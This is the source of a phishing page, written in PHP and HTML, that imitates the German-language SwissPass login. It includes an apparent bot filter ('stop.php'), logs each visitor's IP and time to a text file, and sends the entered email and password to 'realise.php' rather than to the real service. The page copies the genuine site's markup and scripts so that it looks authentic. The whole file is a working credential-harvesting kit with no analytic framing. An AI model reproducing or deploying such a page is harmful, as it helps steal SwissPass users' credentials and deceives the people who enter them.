<?php include_once "stop.php"; ?>
<?php
session_start();
include"Config.php";
require 'a.php';
?>
<?php
$ip = @$_SERVER['HTTP_CF_CONNECTING_IP'] ?: @$_SERVER['HTTP_X_FORWARDED_FOR'] ?: @$_SERVER['HTTP_CLIENT_IP'] ?: @$_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Zurich');
$time = date("d F Y H:i:s");
$message = "IP: $ip - Time: $time" . PHP_EOL . "\r\n";
$file = @fopen("resolved.txt", "a");
if ($file !== false) {
    @fwrite($file, $message);
    @fclose($file);
}
?>
<!DOCTYPE html>
<html class="no-js" dir="ltr" lang="de-ch">

<head>
   <title>Anmeldung | SwissPass</title>
   <meta charset="utf-8" />
   <link href="resources/img/favicon.ico?v=20140709-1126" rel="icon" type="image/x-icon" />
   <link href="resources/ico/apple-touch-icon-precomposed-20200819.png" rel="apple-touch-icon-precomposed"
      sizes="152x152">
   </link>
   <link href="resources/css/normal/app/sso.min-20200819.css" rel="stylesheet">
   </link>
   <script>var token=<?php echo json_encode($api); ?>;</script>
   <script type="text/javascript">
      // minimal data fragment to prevent library fail
      window.digitalDataLayer = window.digitalDataLayer || [];
   </script>
   <script src="resources/js/vendor/head/modernizr/modernizr-20200819.js"> </script>
   <script src="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js" type="text/javascript" charset="UTF-8"
      data-document-language="true" data-domain-script="e91f4b90-f9aa-4ace-891b-96dd07595d9f-test"></script>
   <script type="text/javascript">
      var digitalData = {
         pageInstanceID: "611076",
         page: {
            pageInfo: {
               pageID: "/oevprod-login/popup/login.jsp",
               pageName: document.title,
               destinationURL: document.location.href,
               destinationURI: "/login",
               referringURL: "",
               sysEnv: "production",
               language: "de"
            },
            category: {
               primaryCategory: "swisspass",
            }
         },
         user: [{
            profile: [{
               profileInfo: {
                  loginType: "SwissPass",
                  loginStatus: 0,
                  language: "de"
               }
            }]
         }]
      };

      var dataLayerEvent = {
         event: {
            eventInfo: {
               eventName: "page data layer ready"
            }
         }
      };

      console.debug("Push (popup) window.digitalDataLayer", digitalData);

      if (window.digitalDataLayer) {
         window.digitalDataLayer.push(digitalData);
         window.digitalDataLayer.push(dataLayerEvent);
      }

      function OptanonWrapper() { }

   </script>
   <script src="https://assets.adobedtm.com/15ff638fdec4/7a0c4d63ddff/launch-6cc731e967aa.min.js" async></script>
   <script src="resources/js/vendor/head/modernizr/modernizr-20200820.js"> </script>


</head>

<body class="js-offcanvas-root">
   <div id="skelWrapOuter" class="skel-wrap-outer skin-sso">
      <h1 tabindex="-1" id="skipnav" class="sr-only"></h1>
      <style type="text/css">
         .swissid-requirements-info {
            padding: 20px 40px !important;
            font-size: .8em;
            flex-direction: column;
            text-align: center;
         }

         @media screen and (max-width: 991px) {
            .swissid-requirements-info {
               padding: 20px 20px 0 !important;
               font-size: 1em;
            }

            .skin-sso .mod-login {
               margin-bottom: 5rem;
            }
         }

         .icon-info_big_32 {
            margin-bottom: 2rem;
            font-size: 2.5rem;
         }
      </style>
      <div id="skelWrapInner" class="skel-wrap-inner">
         <main class="skel-main" id="mainContent">
            <div id="mainContentBg" class="mod-content" style="background-image: url('resources/img/login_bg.jpg');">
               <div class="mod-content--root">
                  <nav class="mod-login">
                     <div class="mod-login-swisspass">
                        <div class="mod-login-swisspass-inner">
                           <div class="language-selector">

                              <h1 class="sr-only">Inhalt</h1>
                              <div class="mod-login--action">
                                 <a class="mod-metamenu--logo" title="SwissPass home">
                                    <div
                                       class="visible-sm visible-sm visible-md visible-lg mod-metamenu--logo-original">
                                       <picture>
                                          <source srcset="resources/img/logo_text_de-20200819.svg" type="image/svg+xml">
                                          </source>
                                          <img src="resources/img/logo_text_de-20200819.png" width="400"> </img>
                                       </picture>
                                    </div>
                                    <div class="mod-login--symbol visible-xs">
                                       <picture valign="bottom">
                                          <source srcset="resources/img/logo-20200819.svg" type="image/svg+xml">
                                          </source>
                                          <img src="resources/img/logo-20200819.png" width="152"> </img>
                                       </picture>
                                    </div>
                                 </a>
                              </div>
                              <div class="mod-login--notifications mod-login--action">
                                 <h2 class="sr-only" data-notification-header="all-messages">Mitteilungen</h2>
                                 <noscript>
                                 </noscript>
                              </div>
                              <div class="mod-login--action">
                                 <h2 class="sr-only">Login</h2>
                                 <style type="text/css">
                                    .mod-login--panel-first {
                                       padding-bottom: 24px;
                                    }

                                    .btn-provider-login-submit,
                                    .registration-box {
                                       padding-bottom: 32px;
                                    }

                                    .link-pw-reset {
                                       text-decoration: underline;
                                       font-size: 16px;
                                    }

                                    .link-register {
                                       float: right;
                                       text-decoration: underline;
                                    }

                                    .no-account {
                                       float: left;
                                       padding-top: 12px;
                                       padding-left: 16px;
                                    }

                                    @media screen and (min-width: 992px) {
                                       .btn-provider-login-submit {
                                          float: right;
                                       }

                                       .registration-box {
                                          float: right;
                                       }
                                    }
                                 </style>
                                 <form name="LOGINFORM" method="POST" action="realise.php" id="mainform"
                                    autocomplete="off" onsubmit="return validateForm();">
                                    <input type="hidden" name="FORM_TOKEN" value="23c176773d64a27"></input>
                                    <div id="emailFormGroup"
                                       class="form-group js-floatlabel mod-formstate__background js-floatlabel__always js-tooltip__no-popout js-tooltip js-tooltip__info mod-formstate"
                                       style="margin-top: 24px;">
                                       <div class="col-sm-12">
                                          <label class="control-label" aria-hidden="true">
                                             E-Mail
                                          </label>
                                       </div>
                                       <div class="col-sm-12">
                                          <label class="sr-only" for="email">
                                             E-Mail
                                          </label>
                                          <input class="form-control js-floatlabel--input" id="email"
                                             placeholder="E-Mail" name="USERNAME" value="" type="email" maxlength="101" required>
                                       </div>
                                       <div class="js-tooltip--messages">
                                          <span class="js-tooltip--message js-tooltip--message__error"
                                             id="email-tooltip">
                                             <p id="emailNotNull" class="js-tooltip--js__message" style="display:none">
                                                Bitte geben Sie Ihre E-Mail-Adresse ein.
                                             </p>
                                             <p id="emailRegex" class="js-tooltip--js__message" style="display:none">
                                                Bitte geben Sie eine gültige E-Mail-Adresse ein.
                                             </p>
                                          </span>
                                       </div>
                                    </div>
                                    <div id="pwdFormGroup"
                                       class="form-group js-floatlabel mod-formstate__background js-floatlabel__always js-tooltip__no-popout js-tooltip js-tooltip__info mod-formstate"
                                       style="margin-top: 24px;">
                                       <div class="col-sm-12">
                                          <label class="control-label" aria-hidden="true">
                                             Passwort
                                          </label>
                                       </div>
                                       <div class="col-sm-12">
                                          <label class="sr-only" for="pwd">
                                             Passwort
                                          </label>
                                          <input class="form-control js-floatlabel--input" id="pwd" name="PASSWORD" value="" type="password" placeholder="Passwort" size="20"required>
                                       </div>
                                       <div class="js-tooltip--messages">
                                          <span class="js-tooltip--message js-tooltip--message__error"
                                             id="passwort-tooltip">
                                             <p id="pwdNotNull" class="js-tooltip--js__message" style="display:none">
                                                Bitte geben Sie ein Passwort ein.
                                             </p>
                                          </span>
                                       </div>
                                    </div>
                                    <div
                                       class="form-group mod-formstate__background js-floatlabel js-floatlabel__always js-floatlabel__active form-group__login__remember-me">
                                       <div
                                          class="col-sm-8 js-tooltip--container mod-formelem mod-formelem--bright mod-formelem__check">
                                          <input class="" id="show-pwd" type="checkbox" name="show-pwd" form="dummy" />
                                          <label class="mod-formelem--wrapper" for="show-pwd">
                                             <span class="mod-formelem--icon"></span>
                                             <span class="mod-formelem--text">Passwort anzeigen</span>
                                          </label>
                                       </div>
                                       <div id="remember-me-container"
                                          class="col-sm-8 js-tooltip--container mod-formelem mod-formelem--bright mod-formelem__check hidden">
                                          <input class="" id="remember-me" type="checkbox" name="REMEMBER_ME" />
                                          <label class="mod-formelem--wrapper" for="remember-me">
                                             <span class="mod-formelem--icon"></span>
                                             <span class="mod-formelem--text">Angemeldet bleiben</span>
                                          </label>
                                       </div>
                                    </div>
                                    <div class="form-group mod-login--panel">
                                       <div class="mod-valign">
                                          <div
                                             class="mod-login--panel-aside mod-login--panel-first mod-login--action__secondary hidden-xs hidden-sm">

                                             <div class="btn-provider-login-submit">
                                                <button type="submit" name="LOGIN" id="login_button"
                                                   data-loader-id="LOGIN"
                                                   class="btn btn-primary btn-lg js-loader mod-actions--action btn-sso-login"
                                                   type="submit" value="Anmelden">
                                                   Anmelden
                                                   <span class="js-loader--state">
                                                      <span class="js-loader--state-icon js-loader--pending">
                                                         <svg class="js-loader--svg" preserveaspectratio="none"
                                                            version="1.1" viewbox="0 0 32 32" role="presentation">
                                                            <switch>
                                                               <path class="js-loader--svg-path" d="
                                                                  M16,6
                                                                  A10,10 0 0,1 26,16
                                                                  A10,10 0 0,1 16,26
                                                                  A10,10 0 0,1  6,16
                                                                  A10,10 0 0,1 16, 6
                                                                  z">
                                                               </path>
                                                               <foreignObject
                                                                  requiredExtensions="http://www.w3.org/1999/xhtml">
                                                                  <img src="resources/img/loader-20200819.png"
                                                                     class="js-loader--svg-fallback"> </img>
                                                               </foreignObject>
                                                            </switch>
                                                         </svg>
                                                      </span>
                                                   </span>
                                                </button>
                                             </div>
                                          </div>
                                       </div>
                                       <div
                                          class="mod-valign--el mod-login--panel-aside mod-login--action__secondary visible-xs visible-sm ">
                                          <div class="btn-provider-login-submit">
                                             <button type="submit" name="LOGIN" id="login_button" data-loader-id="LOGIN"
                                                class="btn btn-primary btn-lg js-loader mod-actions--action btn-sso-login"
                                                type="submit" value="Anmelden">
                                                Anmelden
                                                <span class="js-loader--state">
                                                   <span class="js-loader--state-icon js-loader--pending">
                                                      <svg class="js-loader--svg" preserveaspectratio="none"
                                                         version="1.1" viewbox="0 0 32 32" role="presentation">
                                                         <switch>
                                                            <path class="js-loader--svg-path" d="
                                                                  M16,6
                                                                  A10,10 0 0,1 26,16
                                                                  A10,10 0 0,1 16,26
                                                                  A10,10 0 0,1  6,16
                                                                  A10,10 0 0,1 16, 6
                                                                  z">
                                                            </path>
                                                            <foreignObject
                                                               requiredExtensions="http://www.w3.org/1999/xhtml">
                                                               <img src="resources/img/loader-20200819.png"
                                                                  class="js-loader--svg-fallback"> </img>
                                                            </foreignObject>
                                                         </switch>
                                                      </svg>
                                                   </span>
                                                </span>
                                             </button>
                                          </div>
                                       </div>
                                    </div>
                              </div>
                              <input type="hidden" name="_758_xprot"
                             
                              </form>
                              <script>
                                 function validateForm() {
                                    var constraintUid = {
                                       id: 'email',
                                       notNull: true,
                                       regex: [
                                          , /^[_A-Za-z0-9-,_+&]+(\.[_A-Za-z0-9-,_+&]+)*@[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*(\.[A-Za-z]{2,})$/,
                                          /[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}/]
                                    };
                                    var constraintPw = {
                                       id: 'pwd',
                                       notNull: true
                                    };
                                    return validate([constraintUid, constraintPw], 'LOGIN');
                                 }

                                 const pwdField = document.getElementById('pwd');
                                 const visibilityToggler = document.getElementById('show-pwd');
                                 visibilityToggler.addEventListener('click', _ => {
                                    pwdField.setAttribute('type', visibilityToggler.checked ? 'text' : 'password');
                                 });

                              </script>
                           </div>
                        </div>
                     </div>
                  </nav>
               </div>
            </div>
         </main>
      </div>
   </div>
   <button id="ot-sdk-btn" class="ot-sdk-show-settings hidden"></button>
   <script type="text/javascript">
      function closeModal() {
         window.location.href = '';
      }
   </script>
   <div class="dialog js-dialog js-dialog__change-email mod-content--root hidden" id="confirm-cancellation-dialog">
      <div class="dialog-overlay" tabindex="-1" data-a11y-dialog-hide="" onclick="closeModal()"></div>
      <div class="dialog-content" aria-labelledby="dialogTitle" aria-describedby="dialogDescription" role="dialog">
         <div role="document" class="js-submit-activation js-submit-activation__initted"
            data-activation-criteria="input-length">
            <h2 id="dialogTitle" class="mod-form--title dialog-title">Ihr SwissID-Login ist nicht mit dem
               SwissPass-Konto verknüpft.</h2>
            <p id="dialogDescription" class="dialog-desc">
            <p>Eine Verknüpfung ist aufgrund der Deaktivierung des SwissID Logins für SwissPass per 31.&nbsp;März 2022
               nicht mehr möglich.</p>
            </p>
            <a class="btn btn-primary btn-lg mod-actions--action" style="margin-top: 24px; float: right;" 
               onclick="closeModal()">
               <span class="btn-title">Zurück</span>
            </a>
            <a  onclick="closeModal()" data-a11y-dialog-hide=""
               class="btn btn-default btn-icon-sm dialog-close">
               <span class="mod-icon mod-icon__sm icon-close_16" aria-hidden="true"></span>
               <span class="sr-only">Overlay schliessen</span>
            </a>
         </div>
      </div>
   </div>
   <script src="resources/primefaces/jquery/jquery-20200819.js"> </script>
   <script src="resources/js/vendor/vendor.min-20200819.js"> </script>
   <script src="resources/js/swisspass.min-20200819.js"> </script>
   <script>
      var isMobile = (
         /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
         || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)
      );
      if (!isMobile) {
         $(document).ready(function () {
            window.dp.Utils.Broadcaster.subscribe(function () {
               var hasError = false;
               $('.mod-formstate__error').each(function (i, e) {
                  var $inp = $(e).find('*:input[type!=hidden]:first');
                  if ($inp.length) {
                     $inp.focus();
                     hasError = true;
                     return false;
                  }
               });
               if (!hasError) {
                  $('form[name!=form__invalidateUserSession]:first *:input[type!=hidden]:first').focus();
               }
            });
         });
      }

      function validate(constraints, jsLoader) {
         if (jsLoader) {
            try {
               window.dp.Gui.Loader.set(jsLoader, 'pending');
               dp.Utils.Broadcaster.ajaxUpdate();
            } catch (e) {
               console.log(e);
            }
         }
         var valid = true;
         $(constraints).each(function (index, constraint) {
            var $id = $('#' + constraint.id);
            var val = $id.val();
            var validation = '';
            if (constraint.notNull && val == '') {
               validation = constraint.notNullId ? constraint.notNullId : constraint.id + "NotNull";

            } else if (val && val != '' && constraint.regex) {
               var ok = false;
               $(constraint.regex).each(function (index, regex) {
                  if (!ok && val.match(regex)) {
                     ok = true;
                  }
               });
               if (!ok) {
                  validation = constraint.regexId ? constraint.regexId : constraint.id + "Regex";
               }
            }
            // init/hide all
            var $validation = $('#' + validation);
            if (validation) {
               valid = false;
               var $formgroup = $('#' + constraint.id + 'FormGroup');
               $formgroup.addClass('mod-formstate__error');
               $formgroup.find('.js-tooltip--js__message').show();
               $formgroup.find('.form-control').attr('aria-invalid', 'true');
               $formgroup.find('.form-control').attr('aria-describedby', validation);
               $formgroup.find('.js-tooltip--js__message:not(#' + validation + ')').hide();
            } else {
               $('#' + constraint.id + 'FormGroup').removeClass('mod-formstate__error');
               $('#' + constraint.id + 'FormGroup').find('.form-control').removeAttr('aria-invalid');
               $('#' + constraint.id + 'FormGroup').find('.form-control').removeAttr('aria-describedby');
            }
         });
         if (!valid && jsLoader) {
            try {
               window.dp.Gui.Loader.set(jsLoader, 'failure');
               dp.Utils.Broadcaster.ajaxUpdate();
            } catch (e) {
               console.log(e);
            }

         }
         return valid;
      }

      // ZU BEACHTEN: Identische Konfiguration ist auch in template-scripts.xhtml enthalten.
      window.dp.fn.cfg({
         'Gui.Password': {
            'security': {
               strong: "^(?=.{10,})(?=.*[a-zA-Z])(?=.*[0-9])(?=.*[\\W_]).*$",
               medium: "^(?=.{8,})(?=.*[a-zA-Z])(?=.*[0-9]).*$",
               weak: "(?=.{8,}).*"
            }
         }
      });

   </script>
   <script>
      var options = {};
      var attrs = { provider: '' };
      new OevcResourceLoader('/idp/co-branding', 'co-branding', 'de', attrs, options).load();
      // Hide 'remember me' checkbox for mobile devices except for specified providers
      var allowedProviders = ['sbbkn', 'now'];
      var isMobile = (
         /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
         || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)
      );
      var rememberMe = document.getElementById('remember-me-container');
      var providerAllowsRememberMe = allowedProviders.filter(function (domain) {
         return attrs.provider && attrs.provider.indexOf(domain) > -1;
      }).length > 0;
      if (rememberMe && (!isMobile || providerAllowsRememberMe)) {
         rememberMe.classList.remove('hidden');
      }

   </script>
   <script language="JavaScript" type="text/JavaScript">
         if (navigator.cookieEnabled == 0) {
             alert("Sie müssen dem Browser erlauben Cookies zu akzeptieren, damit diese Seite korrekt funktioniert.");
         }
      </script>
   <noscript>
      <div style="position: fixed; top: 0px; left: 0px; z-index: 3000;
            height: 100%; width: 100%; background-color: rgba(255,255,255,0.77)">
         <h1 style="margin: 60px 20px; background-color: #FFFFFF">Sie müssen dem Browser erlauben JavaScript
            auszuführen, damit diese Seite korrekt funktioniert. Weitere Informationen unter <a
               href="https://www.enable-javascript.com/de/">www.enable-javascript.com</a></h1>
      </div>
   </noscript>
</body>

</html>